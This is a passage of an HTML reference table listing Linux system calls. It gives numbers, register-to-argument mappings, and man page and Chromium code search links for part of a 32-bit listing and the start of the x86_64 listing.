href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unshare">cs/</a></td><td align="center">0x136</td><td>unsigned long unshare_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">311</td><td>set_robust_list</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_robust_list">cs/</a></td><td align="center">0x137</td><td>struct robust_list_head *head</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">312</td><td>get_robust_list</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_robust_list">cs/</a></td><td align="center">0x138</td><td>int pid</td><td>struct robust_list_head * *head_ptr</td><td>size_t *len_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">313</td><td>splice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/splice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*splice">cs/</a></td><td align="center">0x139</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td align="center">314</td><td>sync_file_range</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sync_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync_file_range">cs/</a></td><td align="center">0x13a</td><td>int fd</td><td>loff_t offset</td><td>loff_t nbytes</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">315</td><td>tee</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tee.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tee">cs/</a></td><td align="center">0x13b</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">316</td><td>vmsplice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vmsplice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vmsplice">cs/</a></td><td align="center">0x13c</td><td>int fd</td><td>const struct iovec *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">317</td><td>move_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/move_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*move_pages">cs/</a></td><td align="center">0x13d</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void * *pages</td><td>const int *nodes</td><td>int *status</td><td>int flags</td></tr><tr><td align="center">318</td><td>getcpu</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getcpu.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcpu">cs/</a></td><td align="center">0x13e</td><td>unsigned *cpu</td><td>unsigned *node</td><td>struct getcpu_cache *cache</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">319</td><td>epoll_pwait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_pwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_pwait">cs/</a></td><td align="center">0x13f</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td></tr><tr><td align="center">320</td><td>utimensat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utimensat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimensat">cs/</a></td><td align="center">0x140</td><td>int dfd</td><td>const char *filename</td><td>struct __kernel_timespec *utimes</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td align="center">321</td><td>signalfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/signalfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signalfd">cs/</a></td><td align="center">0x141</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">322</td><td>timerfd_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_create">cs/</a></td><td align="center">0x142</td><td>int clockid</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">323</td><td>eventfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/eventfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*eventfd">cs/</a></td><td align="center">0x143</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">324</td><td>fallocate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fallocate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fallocate">cs/</a></td><td align="center">0x144</td><td>int fd</td><td>int mode</td><td>loff_t offset</td><td>loff_t len</td><td>-</td><td>-</td></tr><tr><td align="center">325</td><td>timerfd_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_settime">cs/</a></td><td align="center">0x145</td><td>int ufd</td><td>int flags</td><td>const struct __kernel_itimerspec *utmr</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td></tr><tr><td align="center">326</td><td>timerfd_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_gettime">cs/</a></td><td align="center">0x146</td><td>int ufd</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">327</td><td>signalfd4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/signalfd4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signalfd4">cs/</a></td><td align="center">0x147</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td align="center">328</td><td>eventfd2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/eventfd2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*eventfd2">cs/</a></td><td align="center">0x148</td><td>unsigned int count</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">329</td><td>epoll_create1</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_create1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_create1">cs/</a></td><td align="center">0x149</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">330</td><td>dup3</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup3.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup3">cs/</a></td><td align="center">0x14a</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">331</td><td>pipe2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pipe2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pipe2">cs/</a></td><td align="center">0x14b</td><td>int *fildes</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">332</td><td>inotify_init1</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_init1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_init1">cs/</a></td><td align="center">0x14c</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">333</td><td>preadv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv">cs/</a></td><td align="center">0x14d</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td align="center">334</td><td>pwritev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev">cs/</a></td><td align="center">0x14e</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td align="center">335</td><td>rt_tgsigqueueinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_tgsigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_tgsigqueueinfo">cs/</a></td><td align="center">0x14f</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td></tr><tr><td align="center">336</td><td>perf_event_open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/perf_event_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*perf_event_open">cs/</a></td><td align="center">0x150</td><td>struct perf_event_attr *attr_uptr</td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">337</td><td>recvmmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmmsg">cs/</a></td><td align="center">0x151</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>struct __kernel_timespec *timeout</td><td>-</td></tr><tr><td align="center">338</td><td>fanotify_init</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_init.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_init">cs/</a></td><td align="center">0x152</td><td>unsigned int flags</td><td>unsigned int event_f_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">339</td><td>fanotify_mark</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_mark.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_mark">cs/</a></td><td align="center">0x153</td><td>int fanotify_fd</td><td>unsigned int flags</td><td>u64 mask</td><td>int fd</td><td>const char *pathname</td><td>-</td></tr><tr><td align="center">340</td><td>prlimit64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prlimit64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prlimit64">cs/</a></td><td align="center">0x154</td><td>pid_t pid</td><td>unsigned int resource</td><td>const struct rlimit64 *new_rlim</td><td>struct rlimit64 *old_rlim</td><td>-</td><td>-</td></tr><tr><td align="center">341</td><td>name_to_handle_at</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/name_to_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*name_to_handle_at">cs/</a></td><td align="center">0x155</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flag</td><td>-</td></tr><tr><td align="center">342</td><td>open_by_handle_at</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*open_by_handle_at">cs/</a></td><td align="center">0x156</td><td>int mountdirfd</td><td>struct file_handle *handle</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">343</td><td>clock_adjtime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_adjtime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_adjtime">cs/</a></td><td align="center">0x157</td><td>clockid_t which_clock</td><td>struct __kernel_timex *tx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">344</td><td>syncfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/syncfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syncfs">cs/</a></td><td align="center">0x158</td><td>int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">345</td><td>sendmmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmmsg">cs/</a></td><td align="center">0x159</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>-</td><td>-</td></tr><tr><td align="center">346</td><td>setns</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setns.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setns">cs/</a></td><td align="center">0x15a</td><td>int fd</td><td>int nstype</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">347</td><td>process_vm_readv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_readv">cs/</a></td><td align="center">0x15b</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td align="center">348</td><td>process_vm_writev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_writev">cs/</a></td><td align="center">0x15c</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td align="center">349</td><td>kcmp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kcmp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kcmp">cs/</a></td><td align="center">0x15d</td><td>pid_t pid1</td><td>pid_t pid2</td><td>int type</td><td>unsigned long idx1</td><td>unsigned long idx2</td><td>-</td></tr><tr><td align="center">350</td><td>finit_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/finit_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*finit_module">cs/</a></td><td align="center">0x15e</td><td>int fd</td><td>const char *uargs</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">351</td><td>sched_setattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setattr">cs/</a></td><td align="center">0x15f</td><td>pid_t pid</td><td>struct sched_attr *attr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">352</td><td>sched_getattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getattr">cs/</a></td><td align="center">0x160</td><td>pid_t pid</td><td>struct sched_attr *attr</td><td>unsigned int size</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">353</td><td>renameat2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat2">cs/</a></td><td align="center">0x161</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>unsigned int flags</td><td>-</td></tr><tr><td align="center">354</td><td>seccomp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*seccomp">cs/</a></td><td align="center">0x162</td><td>unsigned int op</td><td>unsigned int flags</td><td>void *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">355</td><td>getrandom</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrandom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrandom">cs/</a></td><td align="center">0x163</td><td>char *buf</td><td>size_t count</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">356</td><td>memfd_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/memfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*memfd_create">cs/</a></td><td align="center">0x164</td><td>const char *uname_ptr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">357</td><td>bpf</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bpf.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bpf">cs/</a></td><td align="center">0x165</td><td>int cmd</td><td>union bpf_attr *attr</td><td>unsigned int size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">358</td><td>execveat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/execveat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execveat">cs/</a></td><td align="center">0x166</td><td>int dfd</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>int flags</td><td>-</td></tr><tr><td align="center">359</td><td>socket</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socket.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socket">cs/</a></td><td align="center">0x167</td><td>int</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">360</td><td>socketpair</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socketpair.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socketpair">cs/</a></td><td align="center">0x168</td><td>int</td><td>int</td><td>int</td><td>int *</td><td>-</td><td>-</td></tr><tr><td align="center">361</td><td>bind</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bind">cs/</a></td><td align="center">0x169</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">362</td><td>connect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/connect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*connect">cs/</a></td><td align="center">0x16a</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">363</td><td>listen</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/listen.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listen">cs/</a></td><td align="center">0x16b</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">364</td><td>accept4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/accept4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept4">cs/</a></td><td align="center">0x16c</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>int</td><td>-</td><td>-</td></tr><tr><td align="center">365</td><td>getsockopt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockopt">cs/</a></td><td align="center">0x16d</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int *optlen</td><td>-</td></tr><tr><td align="center">366</td><td>setsockopt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsockopt">cs/</a></td><td align="center">0x16e</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int optlen</td><td>-</td></tr><tr><td align="center">367</td><td>getsockname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockname">cs/</a></td><td align="center">0x16f</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">368</td><td>getpeername</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpeername.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpeername">cs/</a></td><td align="center">0x170</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">369</td><td>sendto</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendto.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendto">cs/</a></td><td align="center">0x171</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int</td></tr><tr><td align="center">370</td><td>sendmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmsg">cs/</a></td><td align="center">0x172</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">371</td><td>recvfrom</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvfrom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvfrom">cs/</a></td><td align="center">0x173</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int *</td></tr><tr><td align="center">372</td><td>recvmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmsg">cs/</a></td><td align="center">0x174</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">373</td><td>shutdown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shutdown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shutdown">cs/</a></td><td align="center">0x175</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">374</td><td>userfaultfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/userfaultfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*userfaultfd">cs/</a></td><td align="center">0x176</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">375</td><td>membarrier</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/membarrier.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*membarrier">cs/</a></td><td align="center">0x177</td><td>int cmd</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">376</td><td>mlock2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock2">cs/</a></td><td align="center">0x178</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">377</td><td>copy_file_range</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/copy_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*copy_file_range">cs/</a></td><td align="center">0x179</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td align="center">378</td><td>preadv2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv2">cs/</a></td><td align="center">0x17a</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td align="center">379</td><td>pwritev2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev2">cs/</a></td><td align="center">0x17b</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td align="center">380</td><td>pkey_mprotect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_mprotect">cs/</a></td><td align="center">0x17c</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>int pkey</td><td>-</td><td>-</td></tr><tr><td align="center">381</td><td>pkey_alloc</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_alloc.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_alloc">cs/</a></td><td align="center">0x17d</td><td>unsigned long flags</td><td>unsigned long init_val</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">382</td><td>pkey_free</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_free.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_free">cs/</a></td><td align="center">0x17e</td><td>int pkey</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">383</td><td>statx</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statx.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statx">cs/</a></td><td align="center">0x17f</td><td>int dfd</td><td>const char *path</td><td>unsigned flags</td><td>unsigned mask</td><td>struct statx *buffer</td><td>-</td></tr><tr><td align="center">384</td><td>arch_prctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/arch_prctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*arch_prctl">cs/</a></td><td align="center">0x180</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr></tbody></table><h1 id="0x2-x86-64-64bit"><a href="#0x2-x86-64-64bit" class="headerlink" title="0x2 x86_64-64bit"></a>0x2 x86_64-64bit</h1><table><thead><tr><th align="center">NR</th><th>syscall name</th><th align="center">references</th><th align="center">%rax</th><th>arg0 (%rdi)</th><th>arg1 (%rsi)</th><th>arg2 (%rdx)</th><th>arg3 (%r10)</th><th>arg4 (%r8)</th><th>arg5 (%r9)</th></tr></thead><tbody><tr><td align="center">0</td><td>read</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/read.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*read">cs/</a></td><td align="center">0x00</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">1</td><td>write</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/write.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*write">cs/</a></td><td align="center">0x01</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">2</td><td>open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*open">cs/</a></td><td align="center">0x02</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">3</td><td>close</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/close.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*close">cs/</a></td><td align="center">0x03</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">4</td><td>stat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/stat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*stat">cs/</a></td><td align="center">0x04</td><td>const char *filename</td><td>struct __old_kernel_stat 